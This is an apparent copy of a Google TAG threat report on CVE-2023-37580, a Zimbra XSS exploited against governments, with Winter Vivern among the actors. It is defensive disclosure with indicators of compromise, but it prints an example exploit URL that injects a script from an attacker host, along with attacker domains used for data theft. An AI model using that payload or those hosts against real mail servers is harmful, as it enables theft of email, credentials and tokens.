# Reference for threat actor for "Winter Vivern"

**Title**: Zimbra 0-day used to target international government organizations

**Source**: https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/

## Content






Zimbra 0-day used to target international government organizations































































            Updates from Threat Analysis Group (TAG)
        




    Zimbra 0-day used to target international government organizations
  






Share






Twitter





Facebook





LinkedIn





Mail






Copy link


























Threat Analysis Group


Zimbra 0-day used to target international government organizations







Nov 16, 2023
min read






Share






Twitter





Facebook





LinkedIn





Mail






Copy link

















Clement Lecigne

      Threat Analysis Group
    






Maddie Stone

      Threat Analysis Group
    









Share






Twitter





Facebook





LinkedIn





Mail






Copy link































In June 2023, Google’s Threat Analysis Group (TAG) discovered an in-the-wild 0-day exploit targeting Zimbra Collaboration, an email server many organizations use to host their email. Since discovering the 0-day, now patched as CVE-2023-37580, TAG has observed four different groups exploiting the same bug to steal email data, user credentials, and authentication tokens. Most of this activity occurred after the initial fix became public on Github. To ensure protection against these types of exploits, TAG urges users and organizations to keep software fully up-to-date and apply security updates as soon as they become available.0-day discovery, hotfix and patchTAG first discovered the 0-day, a reflected cross-site scripting (XSS) vulnerability, in June when it was actively exploited in targeted attacks against Zimbra’s email server. Zimbra pushed a hotfix to their public Github on July 5, 2023 and published an initial advisory with remediation guidance on July 13, 2023. They patched the vulnerability as CVE-2023-37580 on July 25, 2023.TAG observed three threat groups exploiting the vulnerability prior to the release of the official patch, including groups that may have learned about the bug after the fix was initially made public on Github. TAG discovered a fourth campaign using the XSS vulnerability after the official patch was released. Three of these campaigns began after the hotfix was initially made public highlighting the importance of organizations applying fixes as quickly as possible.









The Vulnerability CVE-2023-37580CVE-2023-37580 is a reflected cross-site scripting (XSS) vulnerability. XSS is a web application vulnerability that allows malicious scripts to be injected into another website. In this case, there was a vulnerability in Zimbra that injected the parameter within the URL directly into the webpage, causing the script to be executed. An example that could trigger the XSS is:https://mail.REDACTED[.]com/m/momovetost=acg%22%2F%3E%3Cscript%20src%3D%22https%3A%2F%2Fobsorth%2Eopwtjnpoc%2Eml%2FpQyMSCXWyBWJpIos%2Ejs%22%3E%3C%2Fscript%3E%2F%2Fwhich decodes to:https://mail.REDACTED[.]com/m/momoveto?st=acg"/><script src="https://REDACTED/script.js"></script>//The fix was to escape the contents of the st parameter before it was set as the value in an html object.




Campaign 1: First known exploitation leads to email-stealing frameworkThe initial in-the-wild discovery of the 0-day vulnerability was a campaign targeting a government organization in Greece. The attackers sent emails containing exploit urls to their targets. If a target clicked the link during a logged-in Zimbra session, the url loaded the same framework that Volexity documented in February 2022. This framework uses the XSS to steal users’ mail data, such as emails and attachments and to set up an auto-forwarding rule to an attacker-controlled email address. The framework was loaded from:https://obsorth.opwtjnpoc[.]ml/pQyMSCXWyBWJpIos.js




Campaign 2: Winter Vivern exploitation after hotfix pushed to GithubThe patch for the vulnerability was pushed to Github on July 5. Another actor exploited the vulnerability for a full two weeks beginning on July 11 before the official patch became available on July 25. TAG identified multiple exploit urls that targeted government organizations in Moldova and Tunisia; each url contained a unique official email address for specific organizations in those governments. TAG attributes this activity to Winter Vivern (UNC4907), an APT group known to exploit XSS in Zimbra and Roundcube. The vulnerability was used to load scripts at:https://applicationdevsoc[.]com/zimbraMalwareDefender/zimbraDefender.jshttps://applicationdevsoc[.]com/tndgt/auth.js




Campaign 3: Exploit used for credential phishingDays before Zimbra pushed their official patch on July 25, TAG observed a third, unidentified group exploiting the vulnerability as part of a campaign that phished for credentials belonging to a government organization in Vietnam. In this case, the exploit url pointed to a script that displayed a phishing page for users’ webmail credentials and posted stolen credentials to a url hosted on an official government domain that the attackers likely compromised.




Campaign 4: N-day exploit used for stealing authentication tokenIn August 2023, after the patch for CVE-2023-37580 was released, TAG discovered a fourth campaign using the vulnerability against a government organization in Pakistan. The exploit was used to steal the Zimbra authentication token. The token was exfiltrated to ntcpk[.]org.




ConclusionThe discovery of at least four campaigns exploiting CVE-2023-37580, three campaigns after the bug first became public, demonstrates the importance of organizations applying fixes to their mail servers as soon as possible. These campaigns also highlight how attackers monitor open-source repositories to opportunistically exploit vulnerabilities where the fix is in the repository, but not yet released to users. The actors behind Campaign #2 began exploiting the bug after the fix was pushed to Github, but before Zimbra publicly released the advisory with remediation advice.The exploitation of CVE-2023-37580 comes on the heels of CVE-2022-24682, another reflected XSS vulnerability in Zimbra mail servers that was actively exploited in-the-wild in 2022 and is followed by the exploitation of CVE-2023-5631, a XSS vulnerability in Roundcube mail servers just this past month. The regular exploitation of XSS vulnerabilities in mail servers also shows a need for further code auditing of these applications, especially for XSS vulnerabilities.We’d like to acknowledge Zimbra for their response and patching of this vulnerability. Following our disclosure policy, TAG shares its research to raise awareness and advance security across the ecosystem. We also add all identified websites and domains to Safe Browsing to safeguard users from further exploitation. We urge users and organizations to apply patches quickly and keep software fully up-to-date for their protection. TAG will remain focused on detecting, analyzing, and preventing 0-day exploitation as well as reporting vulnerabilities to vendors immediately upon discovery.




Indicators of compromise (IoCs)https://obsorth.opwtjnpoc[.]ml/pQyMSCXWyBWJpIos.jshttps://applicationdevsoc[.]com/zimbraMalwareDefender/zimbraDefender.jshttps://applicationdevsoc[.]com/tndgt/auth.jsntcpk[.]orgThanks to TAG's Kristen Dennesen who also contributed to this report.




POSTED IN:






Threat Analysis Group


  















            Related stories
          

















Threat Analysis Group
Buying Spying: How the commercial surveillance industry works and what can be done about it



                  By
                  
                    
                    Shane Huntley
                    

 Feb 06, 2024









Threat Analysis Group
TAG Bulletin: Q4 2023
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q4 2023. It was last updated on January 19, 2024.OctoberWe terminated 8 Y…



                  By
                  
                    
                    Shane Huntley
                    

 Jan 19, 2024


















Threat Analysis Group
Russian threat group COLDRIVER expands its targeting of Western officials to include the use of malware



                  By
                  
                    
                    Wesley Shields
                    

 Jan 18, 2024









Threat Analysis Group
Government-backed actors exploiting WinRAR vulnerability
Google's Threat Analysis Group analyzes recent state-sponsored campaigns exploiting the WinRAR vulnerability, CVE-2023-38831.



                  By
                  
                    
                    Kate Morgan
                    

 Oct 18, 2023









Threat Analysis Group
TAG Bulletin: Q3 2023
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q3 2023. It was last updated on November 8, 2023.



                  By
                  
                    
                    Shane Huntley
                    

 Oct 05, 2023









Threat Analysis Group
0-days exploited by commercial surveillance vendor in Egypt
Last week Google’s Threat Analysis Group (TAG), in partnership with The Citizen Lab, discovered an in-the-wild 0-day exploit chain for iPhones. Developed by the commerci…



                  By
                  
                    
                    Maddie Stone
                    

 Sep 22, 2023






.









































Privacy
            


Terms
            


About Google
            


Google Products
            








              Help
            





        Deutsch
      

        English
      

        English (Africa)
      

        English (Australia)
      

        English (Canada)
      

        English (India)
      

        English (MENA)
      

        Español (España)
      

        Español (Latinoamérica)
      

        Français (Canada)
      

        Français (France)
      

        Italiano
      

        Nederlands (Nederland)
      

        Polski
      

        Português (Brasil)
      

        اللغة العربية (MENA)
      

        한국어
      
















